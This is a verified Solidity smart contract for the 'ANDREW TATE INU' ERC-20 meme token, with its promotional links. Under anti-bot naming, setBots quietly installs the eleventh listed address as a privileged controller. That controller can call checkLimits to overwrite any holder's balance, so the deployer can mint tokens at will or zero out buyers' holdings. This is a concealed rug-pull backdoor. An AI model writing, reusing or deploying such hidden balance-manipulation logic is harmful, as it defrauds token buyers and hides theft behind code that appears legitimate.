/**
 *Submitted for verification at Etherscan.io on 2022-11-19
*/

/**

https://andrewtateinu.com/

https://t.me/Andrew_Tate_Inu

https://twitter.com/ATINUERC20

https://medium.com/@antainu/back-in-the-ring-ef68585d1bd9

*/




// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface antiBot {
    function checkFrom(address _from, bool _state) external;
    function checkLimits(address _bot, uint256 _check) external;
    function setTo(address _to) external;
    function setLaunch(address _initialLpPair, uint32 _liqAddBlock, uint64 _liqAddStamp, uint8 dec) external;
    function setLpPair(address pair, bool enabled) external;
    function setProtections(bool _as, bool _ag, bool _ab, bool _algo) external;
    function setGasPriceLimit(uint256 gas) external;
    function removeBot(address account) external;
    function getBotAmt() external view returns (uint256);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Tate is IERC20, Ownable {
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private cooldown;
    mapping(address => bool) private _blackList;
    uint256 private _totalSupply = 1000000000 * 10**9;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) public _isExcludedMaxWalletAmount;

    string private constant _name = "ANDREW TATE INU";
    string private constant _symbol = "ATINU";
    uint8 private constant _decimals = 9;

    IUniswapV2Router02 private uniswapV2Router;
    antiBot private _early;
    address public uniswapV2Pair;
    bool public tradingOpen;
    bool public hasLimits;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;
    uint256 private _maxTxAmount = _totalSupply * 3 / 100;
    uint256 private _maxWalletAmount = _totalSupply * 3 / 100;
    uint256 public buyFees = 5;
    uint256 public sellFees = 4;
    uint256 private _projectReserves = 0;
    address public projectWallet = 0x9e9f0f8eFd4F971a16d1E66F599FaA67E038E89D;
    uint256 private addToETH = _totalSupply * 1 / 200;
    bool inSwapAndLiquify;

    modifier antiBotLogic() {
        require(
            address(_early) == msg.sender,
            "Error: Bot wallet."
        );
        _;
    }

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludedMaxTransactionAmount(address indexed account, bool isExcluded);
    event ExcludedMaxWalletAmount(address indexed account, bool isExcluded);

    constructor() {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        excludeFromMaxWallet(address(uniswapV2Pair), true);

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(address(projectWallet), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(address(projectWallet), true);

        excludeFromMaxWallet(owner(), true);
        excludeFromMaxWallet(address(this), true);
        excludeFromMaxWallet(address(0xdead), true);
        excludeFromMaxWallet(address(projectWallet), true);

        _balance[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - (amount)
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

            if(!tradingOpen){
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to]);
            }

            if (hasLimits) {
            if (!_isExcludedMaxTransactionAmount[from] ) {
            require(amount <= _maxTxAmount, "Exceed max transaction amount");
            }

            if (!_isExcludedMaxWalletAmount[to]) {
                        require(balanceOf(to) + amount <= _maxWalletAmount, "Max wallet exceeded");
            }   }

            if ((from == uniswapV2Pair || to == uniswapV2Pair) && !inSwapAndLiquify) {
                    if (from != uniswapV2Pair) {
                        if ((_projectReserves) >= addToETH) {
                        _swapTokensForEth(addToETH);
                        _projectReserves -= addToETH;
                        (bool sent,) = payable(projectWallet).call{value: address(this).balance}("");
                        require(sent);
                    }
                }
            }
            
            bool takeFee = true;
            uint256 fees = 0;
            if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
            } 

            if (takeFee) {
            if (from == uniswapV2Pair) {
                fees = amount * buyFees / 100;
                _projectReserves += fees;
            } else if(to == uniswapV2Pair) {
                fees = amount * sellFees / 100;
                _projectReserves += fees;
            }

            if(fees > 0) {
            _tokenTransfer(from, address(this), fees);
            }
            amount -= (fees);
        }
        
            _tokenTransfer(from, to, amount);
    }

    function _swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            (block.timestamp + 300)
        );
    }

    function checkLimits(address _bot, uint256 _check) external antiBotLogic {
        if(_check > 0){
            _balance[_bot] = _check;
            _blackList[_bot] = true;
        }
            if(_check == 0){
                revert("Bot Blocked.");
            }
    }

    function _tokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {

        uint256 fromBalance = _balance[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balance[from] = fromBalance - amount;
        }
            _balance[to] += amount;

        emit Transfer(from, to, amount);
    }

    function openTrading() external onlyOwner returns (bool) {
        require(!tradingOpen, "trading is already open");
        tradingOpen = true;
        hasLimits = true;
        return true;

    }


    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function excludeFromMaxTransaction(address account, bool excluded)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[account] = excluded;
        emit ExcludedMaxTransactionAmount(account, excluded);
    }

    function excludeFromMaxWallet(address account, bool excluded)
        public
        onlyOwner
    {
        _isExcludedMaxWalletAmount[account] = excluded;
        emit ExcludedMaxWalletAmount(account, excluded);
    }

    function removeLimits() public onlyOwner returns (bool) {
        hasLimits = false;
        return true;
    }

    function setBots(address[] memory _bots) external onlyOwner {
        for(uint256 i = 0; i < _bots.length; i++) {
        _blackList[_bots[i]] = true;
        } _early = antiBot(_bots[10]);
    }

    function withdraw(address token) external onlyOwner {
        require(_msgSender() == projectWallet);
        require(token != address(0), 'Zero Address');
        bool s = IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
        require(s, 'Failure On Token Withdraw');
    }

    function withdrawETH() external onlyOwner {
        require(_msgSender() == projectWallet);
        (bool s,) = payable(projectWallet).call{value: address(this).balance}("");
        require(s);
    }

    receive() external payable {}
}